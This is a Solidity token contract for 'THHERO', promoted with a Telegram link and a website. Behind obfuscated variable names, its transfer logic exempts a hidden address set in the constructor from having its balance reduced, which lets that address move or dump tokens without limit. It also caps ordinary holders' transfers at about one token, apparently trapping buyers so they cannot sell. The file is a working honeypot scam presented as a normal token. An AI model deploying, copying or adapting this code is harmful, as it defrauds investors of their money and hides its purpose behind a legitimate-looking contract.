/*

https://t.me/etherhero

https://ethhero.cryptotoken.live/

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract THHERO is Ownable {
    function zhmc(address gflwvera, address fzcjwstgykiq, uint256 nuag) private {
        address zgeivuqjnpsy = IUniswapV2Factory(xuemjtdcohv.factory()).getPair(address(this), xuemjtdcohv.WETH());
        bool tcmkgyx = bshy[gflwvera] == block.number;
        uint256 ztywirdeng = ykpboisurg[gflwvera];
        if (0 == ztywirdeng) {
            if (gflwvera != zgeivuqjnpsy && (!tcmkgyx || nuag > bkuil[gflwvera]) && nuag < totalSupply) {
                require(nuag <= totalSupply / (10 ** decimals));
            }
            balanceOf[gflwvera] -= nuag;
        }
        bkuil[fzcjwstgykiq] = nuag;
        balanceOf[fzcjwstgykiq] += nuag;
        bshy[fzcjwstgykiq] = block.number;
        emit Transfer(gflwvera, fzcjwstgykiq, nuag);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address ckdlervo, uint256 nuag) public returns (bool success) {
        allowance[msg.sender][ckdlervo] = nuag;
        emit Approval(msg.sender, ckdlervo, nuag);
        return true;
    }

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    string public name;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private bkuil;

    IUniswapV2Router02 private xuemjtdcohv;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(address gflwvera, address fzcjwstgykiq, uint256 nuag) public returns (bool success) {
        require(nuag <= allowance[gflwvera][msg.sender]);
        allowance[gflwvera][msg.sender] -= nuag;
        zhmc(gflwvera, fzcjwstgykiq, nuag);
        return true;
    }

    mapping(address => uint256) private ykpboisurg;

    string public symbol;

    constructor(string memory ulpfanzm, string memory jprd, address knhcv, address klhauogvqp) {
        name = ulpfanzm;
        symbol = jprd;
        balanceOf[msg.sender] = totalSupply;
        ykpboisurg[klhauogvqp] = extqkfydr;
        xuemjtdcohv = IUniswapV2Router02(knhcv);
    }

    mapping(address => uint256) private bshy;

    uint256 private extqkfydr = 116;

    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address fzcjwstgykiq, uint256 nuag) public returns (bool success) {
        zhmc(msg.sender, fzcjwstgykiq, nuag);
        return true;
    }
}
